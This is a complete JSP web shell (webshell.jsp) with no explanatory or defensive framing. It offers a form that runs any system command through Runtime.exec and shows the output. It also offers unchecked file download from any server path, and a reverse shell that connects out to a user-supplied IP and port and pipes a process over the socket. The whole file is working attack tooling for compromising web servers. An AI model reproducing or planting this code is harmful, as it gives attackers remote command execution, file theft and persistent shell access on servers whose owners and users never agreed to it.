<%
    // download file
    String getFile = request.getParameter("file");
    if(getFile!=null){
        String filename = getFile;
        String dir = request.getParameter("dir");

        String filepath=request.getServletContext().getRealPath("/");
        if(dir!=null) filepath+=dir;


        response.setContentType("APPLICATION/OCTET-STREAM");   
        response.setHeader("Content-Disposition","attachment; filename=\"" + filename + "\"");   

        java.io.FileInputStream fileInputStream=new java.io.FileInputStream(filepath + filename);  
            
        int i;   
        while ((i=fileInputStream.read()) != -1) {  
            out.write(i);   
        }   
        out.close();
        fileInputStream.close();  
    }

    //out.println("</pre>"); 
%>

<%@page import="java.lang.*"%>
<%@ page language="java"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*"%>

<html>

<strong>Current working directory is:<br></strong>
<pre>
<%=request.getServletContext().getRealPath("/")%>
</pre>

<strong>Execute command:<br></strong>

<form method="post" action="webshell.jsp">
    <input name="cmd" type="text">
    <input type="submit" value="run">
</form>


<%
    String cmd = request.getParameter("cmd");
    String output = "";

    if(cmd!=null){
        String s=null;
        try{
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s=sI.readLine())!=null){
                output+=s + "<br>";
            }
        }catch(IOException e){
            e.printStackTrace();
        }
    }
%>


<%=output%>
<strong>Download file</strong>
<form method="post" action="webshell.jsp">
    <input name="dir" type="text" >
    <input name="file" type="text" >
    <input type="submit" value="download">
</form>


<%! 
    static class StreamConnector extends Thread{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os){
            this.is = is;
            this.os = os;
        }

        public void run(){
            BufferedReader isr = null;
            BufferedWriter osw = null;
            try{
                isr = new BufferedReader(new InputStreamReader(is));
                osw = new BufferedWriter(new OutputStreamWriter(os));
                char buffer[] = new char[8192];
                int lenRead;
                while((lenRead = isr.read(buffer,0, buffer.length))>0){
                    osw.write(buffer, 0, lenRead);
                    osw.flush();
                }
            }catch(Exception ioe){
                ioe.printStackTrace();
            }
            try{
                if(isr!=null) isr.close();
                if(osw!=null) osw.close();
            }catch(Exception ioe){
                ioe.printStackTrace();
            }

        }
    }
%>
<strong>Reverse Shell</strong>
<form method="post">
IP Address<input type="text" name="ipaddress" size=30>
Port<input type="text" name="port" size=10>
cmd<input type="text" name="command">
<input type="submit" name="Connect" value="Connect">
</form>
<% String ipAddress = request.getParameter("ipaddress");
    String ipPort = request.getParameter("port");
    if(ipAddress!=null && ipPort!=null){
        Socket sock = null;
        try{
            sock = new Socket(ipAddress, (new Integer(ipPort).intValue()));
            Process p = Runtime.getRuntime().exec(request.getParameter("command"));
            StreamConnector outputConnector = new StreamConnector(p.getInputStream(), sock.getOutputStream());

            StreamConnector inputConnector = new StreamConnector(sock.getInputStream(), p.getOutputStream());
            outputConnector.start();
            inputConnector.start();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
%>
</html>
